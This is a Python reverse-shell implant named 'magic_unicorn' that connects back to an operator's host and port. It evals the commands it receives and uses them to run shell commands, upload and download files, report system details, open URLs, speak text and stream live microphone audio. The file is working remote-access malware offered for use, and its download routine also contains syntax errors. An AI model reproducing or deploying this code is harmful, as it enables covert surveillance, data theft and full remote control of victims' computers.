#!/usr/bin/env python3

import struct
import socket
import subprocess
import os
import sys
import platform
import getpass
import pathlib
import pwd
import grp
import time
import datetime

import webbrowser as browser

class handler:
    def __init__(self, sock):
        self.sock = sock

    def send(self, data):
        payloaded_packet = struct.pack('>I', len(data)) + data
        self.sock.sendall(payloaded_packet)

    def recv(self):
        payloaded_packet_length = self.recvall(4)
        if not payloaded_packet_length:
            return ""
        payloaded_packet_length = struct.unpack('>I', payloaded_packet_length)[0]
        return self.recvall(payloaded_packet_length)

    def recvall(self, n):
        payloaded_packet = "".encode("UTF-8")
        while len(payloaded_packet) < n:
            frame = self.sock.recv(n - len(payloaded_packet))
            if not frame:
                return None
            payloaded_packet += frame
        return payloaded_packet

class fsmanip:
    def __init__(self):
        self.fsmanip_init = 1
        self.error = '\033[1;31m[-] \033[0m'
        
    def exists_directory(self, path):
        if os.path.isdir(path):
            if os.path.exists(path):
                return (True, "directory")
            else:
                return (False, self.error+"Remote directory: "+path+": does not exist!")
        else:
            directory = os.path.split(path)[0]
            if directory == "":
                directory = "."
            if os.path.exists(directory):
                if os.path.isdir(directory):
                    return (True, "file")
                else:
                    return (False, self.error+"Error: "+directory+": not a directory!")
            else:
                return (False, self.error+"Remote directory: "+directory+": does not exist!")
            
    def file(self, path):
        if os.path.exists(path):
            if os.path.isdir(path):
                return (False, self.error+"Error: "+path+": not a file!")
            else:
                return (True, None)
        else:
            return (False, self.error+"Remote file: "+path+": does not exist!")
    
class custom:
    def __init__(self):
        self.python = "python3"

    def install(self, package):
        subprocess.check_call([self.python, "-m", "pip", "install", "--user", package])

    def execute(self, command):
        command_output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                          stdin=subprocess.PIPE)
        return command_output.stdout.read() + command_output.stderr.read()

class badges:
    def __init__(self):
        self.I = '\033[1;77m[i] \033[0m'
        self.Q = '\033[1;77m[?] \033[0m'
        self.S = '\033[1;32m[+] \033[0m'
        self.W = '\033[1;33m[!] \033[0m'
        self.E = '\033[1;31m[-] \033[0m'
        self.G = '\033[1;34m[*] \033[0m'
        self.GREEN = '\033[0;33m'
        self.RESET = '\033[0m'

class magic_unicorn:
    def __init__(self, server):
        self.version = "v2.0"
        self.handler = handler(server)
        self.custom = custom()
        self.badges = badges()
        self.fsmanip = fsmanip()
        
        self.main_directory = os.getcwd()
        self.home_directory = str(pathlib.Path.home())
        self.temp_directory = ""

    def command_username(self):
        self.handler.send(getpass.getuser().encode("UTF-8"))

    def command_hostname(self):
        self.handler.send(platform.node().encode("UTF-8"))

    def command_pwd(self):
        self.handler.send((self.badges.I + "Current working directory: " + str(os.getcwd())).encode("UTF-8"))

    def command_pid(self):
        self.handler.send((self.badges.I + "PID: " + str(os.getpid())).encode("UTF-8"))

    def command_sysinfo(self):
        sysinfo = ""
        sysinfo += f"{self.badges.I}Operating System: {platform.system()}\n"
        sysinfo += f"{self.badges.I}Computer Hostname: {platform.node()}\n"
        sysinfo += f"{self.badges.I}Computer Username: {getpass.getuser()}\n"
        sysinfo += f"{self.badges.I}Release Version: {platform.release()}\n"
        sysinfo += f"{self.badges.I}Processor Architecture: {platform.processor()}"
        self.handler.send(sysinfo.encode("UTF-8"))

    def command_exit(self):
        server.close()
        os.remove("/tmp/.magic_unicorn")
        sys.exit()

    def command_mic(self):
        try:
            import pyaudio
        except:
            self.custom.install("pyaudio")
            try:
                import pyaudio
            except:
                self.handler.send("fail".encode("UTF-8"))
                return
        self.handler.send("success".encode("UTF-8"))
        CHUNK = 1024 * 4
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)
        while True:
            continue_stream = self.handler.recv()
            print(continue_stream)
            if continue_stream == b"break":
                stream.stop_stream()
                stream.close()
                p.terminate()
                return
            else:
                try:
                    data = stream.read(CHUNK)
                    self.handler.send(data)
                except:
                    stream.stop_stream()
                    stream.close()
                    p.terminate()
                    return

    def command_download(self, cmd_data):
        output_filename = os.path.split(cmd_data.split(" ")[0])[1]
        output_directory = cmd_data.split(" ")[1]
        if not cmd_data.strip():
            pass
        else:
            exists, path_type = self.fsmanip.exists_directory(output_directory):
                if exists:
                    if path_type != "file":
                        if output_directory[-1] == "/":
                            output_directory = output_directory + output_filename
                        else:
                            output_directory =  + "/" + output_filename
                            
                wf = open(output_directory, "wb")
                while True:
                    data = self.handler.recv()
                    if data == b"success":
                        break
                    elif data == b"fail":
                        wf.close()
                        os.remove(output_directory)
                        return
                    wf.write(data)
                wf.close()

    def command_upload(self, cmd_data):
        if not cmd_data.strip():
            pass
        else:
            if not os.path.isfile(cmd_data):
                self.handler.send((self.badges.E + "Remote file: {}: does not exist!".format(cmd_data)).encode("UTF-8"))
            else:
                self.handler.send("true".encode("UTF-8"))
                with open(cmd_data, "rb") as wf:
                    for data in iter(lambda: wf.read(4100), "".encode("UTF-8")):
                        try:
                            self.handler.send(data)
                        except(KeyboardInterrupt, EOFError):
                            wf.close()
                            self.handler.send("fail".encode("UTF-8"))
                            return
                self.handler.send("success".encode("UTF-8"))

    def command_load(self, cmd_data):
        self.handler.send(bytes(self.custom.execute(cmd_data).strip()))

    def command_openurl(self, cmd_data):
        browser.open(cmd_data)
        self.handler.send("".encode("UTF-8"))

    def command_lsdir(self, cmd_data):
        if cmd_data[-1] != "/":
            cmd_data = cmd_data + "/"
        if os.path.isdir(cmd_data):
            names = []
            names.append(".")
            names.append("..")
            for i in sorted(os.listdir(cmd_data)):
                names.append(i)
            directory_contents = ""
            directory_contents += "\n"
            directory_contents += "Listing: " + cmd_data[:-1] + "\n"
            directory_contents += "=" * len("Listing: " + cmd_data[:-1]) + "\n"
            directory_contents += "\n"
            owners = []
            groups = []
            sizes = []
            dates = []
            modes = []
            for i in names:
                owners.append(pwd.getpwuid(os.stat(cmd_data + i).st_uid)[0])
                groups.append(grp.getgrgid(os.stat(cmd_data + i).st_gid)[0])
                sizes.append(str(os.stat(cmd_data + i).st_size))
                dates.append(time.ctime(os.path.getmtime(cmd_data + i)))
                if os.path.isdir(cmd_data + i):
                    modes.append(os.popen("ls -al " + cmd_data + i).read().split(" ")[1].split("\n")[1])
                else:
                    modes.append(os.popen("ls -al " + cmd_data + i).read().split(" ")[0])
            bigger_owner = len(owners[0])
            bigger_group = len(groups[0])
            bigger_size = len(sizes[0])
            bigger_date = len(dates[0])
            bigger_mode = len(modes[0])
            for i in range(0, len(names)):
                if len(owners[i]) > bigger_owner:
                    bigger_owner = len(owners[i])
                if len(groups[i]) > bigger_group:
                    bigger_group = len(groups[i])
                if len(sizes[i]) > bigger_size:
                    bigger_size = len(sizes[i])
                if len(dates[i]) > bigger_date:
                    bigger_date = len(dates[i])
                if len(modes[i]) > bigger_mode:
                    bigger_mode = len(modes[i])
            if bigger_owner >= 6:
                bigger_owner_len = bigger_owner - 3
            else:
                bigger_owner_len = 2
            if bigger_group >= 6:
                bigger_group_len = bigger_group - 3
            else:
                bigger_group_len = 2
            if bigger_size >= 5:
                bigger_size_len = bigger_size - 2
            else:
                bigger_size_len = 2
            if bigger_date >= 14:
                bigger_date_len = bigger_date - 11
            else:
                bigger_date_len = 2
            if bigger_mode >= 6:
                bigger_mode_len = bigger_mode - 3
            else:
                bigger_mode_len = 2
            directory_contents += "Modes"+" "*(bigger_mode_len)+"Owner"+" "*(bigger_owner_len)+"Group"+" "*(bigger_group_len)+"Size"+" "*(bigger_size_len)+"Last Modified"+" "*(bigger_date_len)+"Name\n"
            directory_contents += "-----"+" "*(bigger_mode_len)+"-----"+" "*(bigger_owner_len)+"-----"+" "*(bigger_group_len)+"----"+" "*(bigger_size_len)+"-------------"+" "*(bigger_date_len)+"----\n"
            for i in range(0, len(names)):
                directory_contents += modes[i] + " " * (5 - len(modes[i]) + bigger_mode_len) + owners[i] + " " * (5 - len(owners[i]) + bigger_owner_len) + groups[i] + " " * (5 - len(groups[i]) + bigger_group_len) + sizes[i] + " " * (4 - len(sizes[i]) + bigger_size_len) + dates[i] + " " * (13 - len(dates[i]) + bigger_date_len) + names[i] + "\n"
            directory_contents += "\n"
            self.handler.send(directory_contents.encode("UTF-8"))
        else:
            self.handler.send((self.badges.E + "Error: " + cmd_data[:-1] + ": not a directory!").encode("UTF-8"))
        
    def command_chdir(self, cmd_data):
        if cmd_data == "-":
            if not self.temp_directory:
                self.handler.send((self.badges.E + "Failed to change directory").encode("UTF-8"))
            else:
                temp_directory_2 = os.getcwd()
                os.chdir(self.temp_directory)
                self.handler.send((self.badges.I + "Changed to directory {}.".format(self.temp_directory)).encode("UTF-8"))
                self.temp_directory = temp_directory_2
        elif cmd_data == "!":
            self.temp_directory = os.getcwd()
            os.chdir(self.main_directory)
            self.handler.send((self.badges.I + "Changed to directory {}.".format(self.main_directory)).encode("UTF-8"))
        elif cmd_data == "~":
            self.temp_directory = os.getcwd()
            os.chdir(self.home_directory)
            self.handler.send((self.badges.I + "Changed to directory {}.".format(self.home_directory)).encode("UTF-8"))
        else:
            if not os.path.isdir(cmd_data):
                self.handler.send((self.badges.E + "Failed to change directory").encode("UTF-8"))
            else:
                self.temp_directory = os.getcwd()
                os.chdir(cmd_data)
                self.handler.send((self.badges.I + "Changed to directory {}.".format(cmd_data)).encode("UTF-8"))

    def command_say(self, cmd_data):
        try:
            import pyttsx3
        except:
            self.custom.install("pyttsx3")
            try:
                import pyttsx3
            except:
                self.handler.send("fail".encode("UTF-8"))
                return
        self.handler.send("success".encode("UTF-8"))
        engine = pyttsx3.init()
        engine.say(cmd_data)
        engine.runAndWait()

    def command_shell(self, cmd_data):
        self.handler.send(bytes(self.custom.execute(cmd_data).strip()))

    def shell(self):
        global server, handler
        while True:
            command = self.handler.recv()
            if command.strip():
                command = eval(command.decode("UTF-8", "ignore").strip())
                if command[0] == "username":
                    self.command_username()
                elif command[0] == "hostname":
                    self.command_hostname()
                elif command[0] == "pwd":
                    self.command_pwd()
                elif command[0] == "pid":
                    self.command_pid()
                elif command[0] == "sysinfo":
                    self.command_sysinfo()
                elif command[0] == "exit":
                    self.command_exit()
                elif command[0] == "mic":
                    self.command_mic()
                elif command[0] == "download":
                    self.command_upload(command[1])
                elif command[0] == "upload":
                    self.command_download(command[1])
                elif command[0] == "load":
                    self.command_load(command[1])
                elif command[0] == "openurl":
                    self.command_openurl(command[1])
                elif command[0] == "lsdir":
                    self.command_lsdir(command[1])
                elif command[0] == "chdir":
                    self.command_chdir(command[1])
                elif command[0] == "say":
                    self.command_say(command[1])
                elif command[0] == "shell":
                    self.command_shell(command[1])
                else:
                    pass

if len(sys.argv) != 3:
    print("Usage: magic_unicorn.py <remote_host> <remote_port>")
    sys.exit()

RHOST = sys.argv[1]
RPORT = int(sys.argv[2])

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.connect((RHOST, RPORT))

magic_handler = magic_unicorn(server)
magic_handler.shell()
